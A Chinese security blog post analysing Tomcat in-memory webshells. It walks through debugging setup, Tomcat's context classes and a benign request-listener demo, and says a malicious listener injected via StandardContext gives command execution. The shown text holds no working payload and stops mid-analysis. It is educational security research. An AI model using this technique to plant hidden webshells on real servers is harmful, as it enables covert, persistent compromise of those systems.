<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>Tomcat内存马分析 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="Tomcat内存马分析 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:39:20.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">Tomcat内存马分析</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="x2F-Java内存马分析-待看）"><a href="#x2F-Java内存马分析-待看）" class="headerlink" title="&#x2F;Java内存马分析(待看）"></a>&#x2F;Java内存马分析(待看）</h1><p>Y4大佬的0-1建议看看哦，真的感觉学到了很多（思想方面吧）</p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a><br>入坑四个月拉<br>——————————————————————</p>
<h1 id="x2F-环境搭建问题与排查"><a href="#x2F-环境搭建问题与排查" class="headerlink" title="&#x2F;环境搭建问题与排查"></a>&#x2F;环境搭建问题与排查</h1><h2 id="tomcat动态调试环境"><a href="#tomcat动态调试环境" class="headerlink" title="tomcat动态调试环境"></a>tomcat动态调试环境</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a><br>将tomcat的源码全部导入当前的源码目录<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673452456462-f1cd1d6a-628b-4366-96ee-9a1e3971b128.png#averageHue=%233d434a&clientId=u192d6e5e-6ef1-4&from=paste&height=251&id=u177b587b&name=image.png&originHeight=314&originWidth=587&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17922&status=done&style=none&taskId=u38814a29-76f4-44c3-86c1-896173a8e6f&title=&width=469.6" alt="image.png"></p>
<h2 id="中文乱码问题"><a href="#中文乱码问题" class="headerlink" title="中文乱码问题"></a>中文乱码问题</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673452503100-786257ca-0078-4ece-b3d6-e2af0115544d.png#averageHue=%233f4345&clientId=u192d6e5e-6ef1-4&from=paste&height=158&id=u0e636dd9&name=image.png&originHeight=198&originWidth=991&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18897&status=done&style=none&taskId=u04146e1b-b70f-4794-a4ec-8734f1b9b44&title=&width=792.8" alt="image.png"><br>首先configuration这里加上一个<code>-Dfile.encoding=UTF-8 </code><br>其次在项目结构这：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673452550311-e556e32f-e549-4ea6-8792-a9440346c370.png#averageHue=%233d4146&clientId=u192d6e5e-6ef1-4&from=paste&height=428&id=u3e974ebd&name=image.png&originHeight=535&originWidth=1505&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62532&status=done&style=none&taskId=ud861bf57-bd5b-4978-acf6-85393f47191&title=&width=1204" alt="image.png"><br>and then：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673452573832-3e1a7d47-3f53-461b-bff1-fa51987ab08c.png#averageHue=%233d4246&clientId=u192d6e5e-6ef1-4&from=paste&height=263&id=uafb7ce7d&name=image.png&originHeight=329&originWidth=1460&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32983&status=done&style=none&taskId=u27b867fb-2afe-49bf-bea0-0b0780efe75&title=&width=1168" alt="image.png"></p>
<h2 id="普通Maven转为Web项目"><a href="#普通Maven转为Web项目" class="headerlink" title="普通Maven转为Web项目"></a>普通Maven转为Web项目</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673452636202-e05b576e-38b8-41f5-aa10-2cfb4c3ee3fc.png#averageHue=%233c4145&clientId=u192d6e5e-6ef1-4&from=paste&height=706&id=u101fa380&name=image.png&originHeight=883&originWidth=1431&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67971&status=done&style=none&taskId=u28f4d82b-a73c-48f7-a4e7-05d01609d4a&title=&width=1144.8" alt="image.png"><br>在module处加一个web项目就好，注意配置好一些路径</p>
<h2 id="Artifact设置"><a href="#Artifact设置" class="headerlink" title="Artifact设置"></a>Artifact设置</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673452742497-81116eeb-c89e-4d48-9a29-f4b2035c8c90.png#averageHue=%233c4146&clientId=u192d6e5e-6ef1-4&from=paste&height=323&id=ue03ece97&name=image.png&originHeight=404&originWidth=1231&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34660&status=done&style=none&taskId=u6030cd42-4d97-489a-8628-dc8a57478f7&title=&width=984.8" alt="image.png"><br>简单设置一下结果文件即可</p>
<h1 id="x2F-Tomcat中三个Context"><a href="#x2F-Tomcat中三个Context" class="headerlink" title="&#x2F;Tomcat中三个Context"></a>&#x2F;Tomcat中三个Context</h1><h2 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h2><p>在Tomcat中的servlet都基本上需要实现这个接口，规定了如果要实现一个WEB容器，他的内容就必须要包含Servletcontext里的内容，内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javax.servlet;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ServletContext</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">TEMPDIR</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.context.tempdir&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ORDERED_LIBS</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.context.orderedLibs&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getContextPath</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    ServletContext <span class="title function_">getContext</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    Servlet <span class="title function_">getServlet</span><span class="params">(String var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    Enumeration&lt;Servlet&gt; <span class="title function_">getServlets</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    Enumeration&lt;String&gt; <span class="title function_">getServletNames</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(Exception var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(String var1, Throwable var2)</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getRealPath</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getServerInfo</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getInitParameter</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    Enumeration&lt;String&gt; <span class="title function_">getInitParameterNames</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">setInitParameter</span><span class="params">(String var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">getAttribute</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    Enumeration&lt;String&gt; <span class="title function_">getAttributeNames</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setAttribute</span><span class="params">(String var1, Object var2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">removeAttribute</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getServletContextName</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    Dynamic <span class="title function_">addServlet</span><span class="params">(String var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line">    Dynamic <span class="title function_">addServlet</span><span class="params">(String var1, Servlet var2)</span>;</span><br><span class="line"></span><br><span class="line">    Dynamic <span class="title function_">addServlet</span><span class="params">(String var1, Class&lt;? extends Servlet&gt; var2)</span>;</span><br><span class="line"></span><br><span class="line">    Dynamic <span class="title function_">addJspFile</span><span class="params">(String var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">Servlet</span>&gt; T <span class="title function_">createServlet</span><span class="params">(Class&lt;T&gt; var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    ServletRegistration <span class="title function_">getServletRegistration</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, ? <span class="keyword">extends</span> <span class="title class_">ServletRegistration</span>&gt; getServletRegistrations();</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String var1, Filter var2)</span>;</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String var1, Class&lt;? extends Filter&gt; var2)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">Filter</span>&gt; T <span class="title function_">createFilter</span><span class="params">(Class&lt;T&gt; var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    FilterRegistration <span class="title function_">getFilterRegistration</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, ? <span class="keyword">extends</span> <span class="title class_">FilterRegistration</span>&gt; getFilterRegistrations();</span><br><span class="line"></span><br><span class="line">    SessionCookieConfig <span class="title function_">getSessionCookieConfig</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setSessionTrackingModes</span><span class="params">(Set&lt;SessionTrackingMode&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    Set&lt;SessionTrackingMode&gt; <span class="title function_">getDefaultSessionTrackingModes</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    Set&lt;SessionTrackingMode&gt; <span class="title function_">getEffectiveSessionTrackingModes</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addListener</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">EventListener</span>&gt; <span class="keyword">void</span> <span class="title function_">addListener</span><span class="params">(T var1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addListener</span><span class="params">(Class&lt;? extends EventListener&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">EventListener</span>&gt; T <span class="title function_">createListener</span><span class="params">(Class&lt;T&gt; var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    JspConfigDescriptor <span class="title function_">getJspConfigDescriptor</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    ClassLoader <span class="title function_">getClassLoader</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">declareRoles</span><span class="params">(String... var1)</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getVirtualServerName</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">getSessionTimeout</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setSessionTimeout</span><span class="params">(<span class="type">int</span> var1)</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getRequestCharacterEncoding</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setRequestCharacterEncoding</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getResponseCharacterEncoding</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setResponseCharacterEncoding</span><span class="params">(String var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672939085365-3f8b6318-ae0b-403d-a36f-df2a3fa5fd1e.png#averageHue=%2355824a&clientId=u4b348ca1-3d98-4&from=paste&height=226&id=ub2b30c3d&name=image.png&originHeight=282&originWidth=972&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58599&status=done&style=none&taskId=ud15f4030-b17e-45cf-b6d9-888cdd580e0&title=&width=777.6" alt="image.png"></p>
<h2 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h2><p>在Tomcat中，ServletContext的实现就是ApplicationContext<br><strong>其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等</strong><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672940170730-d02a2856-aff1-4159-96f7-3914ab4e8d38.png#averageHue=%232f2c2b&clientId=ue89775cf-4c5c-4&from=paste&height=201&id=u0e05f63f&name=image.png&originHeight=251&originWidth=992&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58668&status=done&style=none&taskId=u41d50677-02dc-4e63-bfb8-803231a2eef&title=&width=793.6" alt="image.png"><br>往下看看可以发现ApplicationContext都是基于this.context：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672940336013-3752f533-fa6e-4f68-aa42-6310617844ac.png#averageHue=%232f2e2d&clientId=ue89775cf-4c5c-4&from=paste&height=136&id=ucc2b4f87&name=image.png&originHeight=170&originWidth=874&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33250&status=done&style=none&taskId=ue317ce4a-38f0-498f-8171-7171afd942b&title=&width=699.2" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672940341376-0a58327b-7bb4-46b8-bd26-fc4f69795edb.png#averageHue=%232c2b2b&clientId=ue89775cf-4c5c-4&from=paste&height=344&id=u2a4839a8&name=image.png&originHeight=430&originWidth=1054&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41785&status=done&style=none&taskId=uf842fbb7-c407-476e-84fd-625f1f2d6e1&title=&width=843.2" alt="image.png"><br>绝大部分方法都是基于this.context,然后this.context实际上就是StanrdContext：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672940363713-cfb8d735-76b4-4964-b6b4-5fac0c3dbad7.png#averageHue=%23312e2c&clientId=ue89775cf-4c5c-4&from=paste&height=128&id=u2e5ddee5&name=image.png&originHeight=160&originWidth=753&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42877&status=done&style=none&taskId=uc1338eb6-1f5f-4b96-8ce9-0aabf8f3017&title=&width=602.4" alt="image.png"></p>
<h2 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h2><p>StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。<br>用下面这张图来展示一下其中的关系：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615790929311-f1c15d6e-c317-41c2-9ea7-eadc91a691cf.png#averageHue=%23f8f6f5&from=url&id=r4O3M&originHeight=713&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h1 id="x2F-Linsten型内存马分析"><a href="#x2F-Linsten型内存马分析" class="headerlink" title="&#x2F;Linsten型内存马分析"></a>&#x2F;Linsten型内存马分析</h1><p>在Tomcat中，处理请求的流程如下图：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673082683340-a07bccc5-8743-42ee-9563-1038c526b9cb.png#averageHue=%23efefef&clientId=u843814c5-0ac4-4&from=paste&height=164&id=u3f77bae9&name=image.png&originHeight=205&originWidth=1414&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34955&status=done&style=none&taskId=ubc5abba8-cb99-4694-be64-bec70a4e553&title=&width=1131.2" alt="image.png"><br>Listen-&gt;Filter-&gt;Servlet<br>因此最先接受请求并且判断的就是Listener了，这时候就可以在监听时，运行恶意代码，注入内存马，而Listener分为以下几种：</p>
<ul>
<li>ServletContext，服务器启动和终止时触发</li>
<li>Session，有关Session操作时触发</li>
<li>Request，访问服务时触发</li>
</ul>
<p>Request就是最好触发和注入内存马的种类了，只需要访问一个路由输入参数即可RCE<br>在tomcat中Listener必须实现2个接口LifecycleLisntener和EventListener：<br>现了LifecycleListener接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马。<br>因此我们重点来看<code>EventListener</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673083016186-025428ce-cf02-4f89-85a6-79b6f68c0e2a.png#averageHue=%232d2c2b&clientId=u843814c5-0ac4-4&from=paste&height=238&id=u20db0581&name=image.png&originHeight=298&originWidth=801&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25896&status=done&style=none&taskId=ud9d4568a-d39f-42e7-a338-5d67ed5a7d2&title=&width=640.8" alt="image.png"><br><code>ServletRequestListener</code>接口继承了它，因此我们只需要用ServletRequestListener即可<br>servletRequestListener用于监听ServletRequest对象的创建和销毁，当我们访问任意资源，无论是servlet、jsp还是静态资源，都会触发requestInitialized方法。<br>在这里，通过一个demo来介绍下ServletRequestListener与其执行流程<br>写一个继承于ServletRequestListener接口的Listener：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestDestroyed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestInitialized&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后在web.xml去注册:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.boogipop.listener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>现在访问任何一个地址都会出现结果：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673083263593-2cc0fd2b-1d4b-4dad-8547-a69086487add.png#averageHue=%23efdeac&clientId=u843814c5-0ac4-4&from=paste&height=225&id=ue63db710&name=image.png&originHeight=281&originWidth=1003&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27999&status=done&style=none&taskId=ue15ae3f4-64b3-46db-9952-bbc5521b275&title=&width=802.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673083278599-40a38b3a-6c71-4ef9-a429-b78f1d1de32a.png#averageHue=%23362f2e&clientId=u843814c5-0ac4-4&from=paste&height=102&id=u35e3e2ff&name=image.png&originHeight=127&originWidth=585&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18034&status=done&style=none&taskId=ued2c55fc-4cbf-47ce-9a01-a4f4d17757f&title=&width=468" alt="image.png"><br>先执行了<code>requestInitialized</code>后执行了<code>requestDestoryed</code>方法</p>
<h2 id="正常流程分析"><a href="#正常流程分析" class="headerlink" title="正常流程分析"></a>正常流程分析</h2><p>在上面也说了<code>StandardContext</code>对象才是真正起作用的一个Context，可以通过获取它来添加恶意监听器<br>下断点调试一下，在requestInitialized处：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673107765676-262b5822-9f91-4396-8dfa-fc17b87bb06b.png#averageHue=%233b4145&clientId=uedbe1f37-576f-4&from=paste&height=395&id=u5eae1db8&name=image.png&originHeight=494&originWidth=643&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70913&status=done&style=none&taskId=u33e2dfc7-3be6-41a6-9d8f-42642d91958&title=&width=514.4" alt="image.png"><br>可以看到一整套完整的调用栈，我们反向溯源一波：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673107842275-081b8557-5d31-4cbb-b2cd-ff06044e5fda.png#averageHue=%23847248&clientId=uedbe1f37-576f-4&from=paste&height=342&id=uf8abdd10&name=image.png&originHeight=428&originWidth=1196&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86442&status=done&style=none&taskId=u888e00e9-0426-44bc-a6f9-4aec8ba1d07&title=&width=956.8" alt="image.png"><br>在StandardContext中调用了<code>listen.requestInitialize</code>方法，往上可以发现listener是从instance数组中取出的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673107966129-b954eda0-a24a-4fc3-ba03-8f799eacbe03.png#averageHue=%23312d2c&clientId=uedbe1f37-576f-4&from=paste&height=454&id=ued03fc06&name=image.png&originHeight=568&originWidth=965&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91385&status=done&style=none&taskId=uf9a3ba5e-1599-4d5d-902c-ddd4bf677e5&title=&width=772" alt="image.png"><br>而instance数组是通过<code>getApplicationEventListeners()</code>方法所得到的，因此继续跟踪：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673108109675-04322d94-c877-4855-a1be-4d9f1fa15dd2.png#averageHue=%23827052&clientId=uedbe1f37-576f-4&from=paste&height=356&id=u8eb05a56&name=image.png&originHeight=445&originWidth=1165&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81081&status=done&style=none&taskId=u178ba523-8c42-4a6a-a536-7da6a38f371&title=&width=932" 